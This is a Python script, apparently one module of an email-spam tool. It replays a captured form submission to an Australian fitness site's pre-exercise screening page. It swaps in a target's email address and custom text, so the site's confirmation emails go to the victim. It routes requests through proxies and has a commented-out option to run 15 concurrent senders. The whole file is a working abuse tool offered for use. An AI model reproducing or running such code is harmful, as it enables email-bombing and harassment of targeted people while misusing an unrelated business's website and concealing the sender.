from os.path import basename

import requests

import module


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'wpcw_timezone': 'Europe/Kiev',
            '_gid': 'GA1.3.449841643.1675681288',
            '_ga_L22EN0L2VD': 'GS1.1.1675690883.3.0.1675690883.0.0.0',
            '_ga': 'GA1.3.1101226089.1675331083',
            '_gat_gtag_UA_150416879_1': '1',
        }

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryyiNhc7MtPA39Avg0',
            'Origin': 'https://www.eyeofthetigerfitness.com.au',
            'Referer': 'https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = '------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_action"\r\n\r\ncreate\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n11\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_hide_fields_11"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="form_key"\r\n\r\nadultpre-exercisescreeningsystem2\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[0]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_submit_entry_11"\r\n\r\n5f545076a5\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/adult-pre-exercise-screening-system/\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[102]"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[103]"\r\n\r\n28/02/2023\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[104]"\r\n\r\ntest\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[105]"\r\n\r\n07/06/2001\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[106]"\r\n\r\nPrefer not to say\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[other][106]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[107]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[108]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[109]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[110]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[111]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[112]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[113]"\r\n\r\nYes\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[115][typed]"\r\n\r\nsign\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[115][output]"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_meta[116]"\r\n\r\n546\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="item_key"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_verify"\r\n\r\n\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0\r\nContent-Disposition: form-data; name="frm_state"\r\n\r\nXwacx0cIhIUONb6isFDv8ebRGKo1UDexT5SpU17awR4=\r\n------WebKitFormBoundaryyiNhc7MtPA39Avg0--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text(target=target))
        response = requests.post(
            'https://www.eyeofthetigerfitness.com.au/adult-pre-exercise-screening-system/',
            cookies=cookies,
            headers=headers,
            data=data.encode(),
            proxies=self.get_proxies(), timeout=30
        )
        return response


def main():
    s = 'Thanks for completing the screening questionnaire'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(15)


if __name__ == '__main__':
    main()
